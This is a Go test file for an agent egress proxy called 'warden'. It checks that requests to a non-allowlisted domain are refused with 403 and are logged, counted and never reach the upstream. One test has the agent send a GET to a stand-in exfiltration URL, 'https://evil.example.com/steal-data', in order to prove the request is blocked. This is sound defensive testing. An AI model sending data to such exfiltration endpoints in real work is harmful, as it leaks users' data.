package scenarios

import (
	"net/http"
	"strings"
	"testing"

	"github.com/ethosagent/warden/test/harness"
)

// nonAllowlistedBlocked ports TestE2E_NonAllowlistedBlocked: a CONNECT to a
// domain that is not on the allowlist gets 403, nothing reaches the upstream,
// and the denial is recorded in the worker's analytics store.
func nonAllowlistedBlocked(t *testing.T, h *harness.H) {
	evil := h.Upstream("evil.example.com") // exists, but is never allowlisted

	if got := connectStatus(t, h, "evil.example.com:443"); got != http.StatusForbidden {
		t.Fatalf("CONNECT to the non-allowlisted evil.example.com = %d, want 403", got)
	}
	if got := len(eventsFor(h.Events(), "evil.example.com", "deny")); got == 0 {
		t.Fatal("no deny event for evil.example.com in the analytics store")
	}
	if got := len(evil.Requests()); got != 0 {
		t.Errorf("the denied upstream saw %d request(s), want 0", got)
	}
}

// defaultDeny is manual step 2 (a blocked destination), driven the way an agent
// does it: its HTTP client is refused at the tunnel, the refusal is exactly one
// deny event, and the decision log names the domain, and the blocked metric carries
// reason="policy". Note what is NOT asserted: a policy deny event carries no
// reason today (Event.Reason is the MCP path's field; #409), so the scenario
// pins the decision and the metric, not an event reason.
func defaultDeny(t *testing.T, h *harness.H) {
	evil := h.Upstream("evil.example.com")

	_, err := h.Agent().Get("https://evil.example.com/steal-data")
	if err == nil {
		t.Fatal("the agent's GET to a non-allowlisted destination succeeded; default-deny is broken")
	}
	if !strings.Contains(err.Error(), "Forbidden") {
		t.Errorf("agent error = %v, want the proxy's 403 Forbidden", err)
	}
	if got := connectStatus(t, h, "evil.example.com:443"); got != http.StatusForbidden {
		t.Errorf("CONNECT status = %d, want 403", got)
	}

	denies := eventsFor(h.Events(), "evil.example.com", "deny")
	// The agent's GET and the explicit CONNECT are two refused tunnels.
	if len(denies) != 2 {
		t.Errorf("deny events for evil.example.com = %d, want 2 (one per refused tunnel)", len(denies))
	}
	// TODO(#409): assert Event.Reason once policy denies carry one.
	if !strings.Contains(h.Logs(), `"decision":"deny"`) {
		t.Error("the worker's decision log has no deny line")
	}
	// One blocked count per refused tunnel, labelled with the policy reason.
	blocked := harness.MetricKey("warden.blocked.total", map[string]string{"reason": "policy"})
	h.Eventually("the policy-blocked metric to reach 2", func() bool {
		return h.Metrics()[blocked] == 2
	})
	if got := len(evil.Requests()); got != 0 {
		t.Errorf("the denied upstream saw %d request(s), want 0", got)
	}
}
